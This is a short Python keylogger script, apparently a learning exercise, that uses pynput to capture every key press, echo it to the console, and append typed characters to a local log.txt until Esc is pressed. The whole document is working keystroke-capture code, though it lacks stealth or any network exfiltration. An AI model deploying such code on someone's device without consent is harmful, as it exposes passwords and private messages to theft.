import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):

    global keys,count

    keys.append(key)

    count +=1

    

    print(f"{key} pressed")

    # if key == Key.backspace:
    #     keys.pop([-1])

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []


def writeFile(keys):
    with open("log.txt", "a") as f:
        for key in keys:

            k = str(key).replace("'","")

            if k.find("backspace") > 0:
                f.write("-")

            if k.find("space") > 0 or k.find("enter") > 0:
                f.write('\n')
             
            elif k.find("esc") > 0:
                f.write('\n program has been exited')

            elif k.find("Key") == -1:
                f.write(k)



            #f.write(str(key))

def on_release(key):

    if key == Key.esc:
        return False

    print(f"{key} realeased")

with Listener(on_press= on_press, on_release= on_release) as listner:
    listner.join() 